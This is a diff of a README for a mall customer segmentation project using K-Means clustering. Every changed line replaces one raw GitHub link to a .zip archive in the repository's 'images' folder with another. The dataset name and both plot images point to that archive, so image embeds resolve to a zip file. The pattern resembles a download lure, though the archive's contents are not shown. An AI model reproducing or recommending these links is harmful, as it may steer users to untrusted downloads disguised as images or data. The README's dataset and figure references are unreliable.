@@ -11,7 +11,7 @@ customer behavior and improve targeted marketing strategies.
 
 ## Dataset
 
-- **Name:** https://raw.githubusercontent.com/Himanwell/mall-customer-segmentation/main/images/mall-segmentation-customer-3.9.zip
+- **Name:** https://raw.githubusercontent.com/Himanwell/mall-customer-segmentation/main/images/segmentation-mall-customer-1.5.zip
 - **Number of records:** 200 customers
 - **Features used for clustering:**
   - Annual Income (k$)
@@ -48,7 +48,7 @@ customer behavior and improve targeted marketing strategies.
 The elbow method was used to identify the optimal number of clusters by analyzing
 the Within-Cluster Sum of Squares (WCSS).
 
-![Elbow Method Plot](https://raw.githubusercontent.com/Himanwell/mall-customer-segmentation/main/images/mall-segmentation-customer-3.9.zip)
+![Elbow Method Plot](https://raw.githubusercontent.com/Himanwell/mall-customer-segmentation/main/images/segmentation-mall-customer-1.5.zip)
 
 ---
 
@@ -58,7 +58,7 @@ The plot below shows the final customer clusters formed using K-Means clustering
 Each color represents a different customer group, while the black points represent
 cluster centroids.
 
-![Customer Segmentation Plot](https://raw.githubusercontent.com/Himanwell/mall-customer-segmentation/main/images/mall-segmentation-customer-3.9.zip)
+![Customer Segmentation Plot](https://raw.githubusercontent.com/Himanwell/mall-customer-segmentation/main/images/segmentation-mall-customer-1.5.zip)
 
 ---
 
